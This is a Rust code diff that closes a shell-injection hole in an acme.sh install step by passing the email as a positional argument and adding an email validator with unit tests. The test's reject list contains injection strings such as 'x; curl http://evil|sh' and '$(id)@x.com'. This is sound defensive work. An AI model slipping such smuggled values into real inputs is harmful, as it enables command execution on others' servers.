@@ -23,11 +23,18 @@ pub fn ensure_acme(
     if domain.is_empty() {
         anyhow::bail!("domain required for real cert");
     }
+    if !email.is_empty() {
+        validate_email(email)?;
+    }
     if which::which("acme.sh").is_err() {
         info!("installing acme.sh ...");
+        // Email is passed as a positional shell parameter; never interpolate
+        // user input into the command string.
         let status = Command::new("sh")
             .arg("-c")
-            .arg(format!("curl https://get.acme.sh | sh -s email={email}"))
+            .arg(r#"curl -fsSL https://get.acme.sh | sh -s -- email="$1""#)
+            .arg("sub-maker-acme-install")
+            .arg(email)
             .status()?;
         if !status.success() {
             anyhow::bail!("acme install failed");
@@ -228,9 +235,54 @@ fn command_exists(name: &str) -> bool {
     which::which(name).is_ok()
 }
 
+/// Accepts ordinary contact emails only; rejects anything that could not
+/// appear in an ACME registration anyway (and that would be hostile in logs).
+pub fn validate_email(email: &str) -> anyhow::Result<()> {
+    let (local, domain) = email
+        .split_once('@')
+        .ok_or_else(|| anyhow::anyhow!("invalid email: {email:?}"))?;
+    let ok_local = !local.is_empty()
+        && local
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'%' | b'+' | b'-'));
+    let ok_domain = !domain.is_empty()
+        && domain
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-'))
+        && !domain.starts_with('-')
+        && !domain.starts_with('.');
+    if ok_local && ok_domain {
+        Ok(())
+    } else {
+        anyhow::bail!("invalid email: {email:?}")
+    }
+}
+
 fn acme_home() -> String {
     let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
     format!("{home}/.acme.sh")
+}
+
+#[cfg(test)]
+mod tests {
+    use super::validate_email;
+
+    #[test]
+    fn validate_email_accepts_plain_addresses_and_rejects_shell_syntax() {
+        for ok in ["ops@example.com", "a.b+c@d-1.io"] {
+            assert!(validate_email(ok).is_ok(), "should accept {ok:?}");
+        }
+        for bad in [
+            "x; curl http://evil|sh",
+            "a`b@x.com",
+            "$(id)@x.com",
+            "no-at",
+            "@x.com",
+            "a@",
+        ] {
+            assert!(validate_email(bad).is_err(), "should reject {bad:?}");
+        }
+    }
 }
 
 fn copy_file(src: &Path, dst: &Path, mode: u32) -> anyhow::Result<()> {
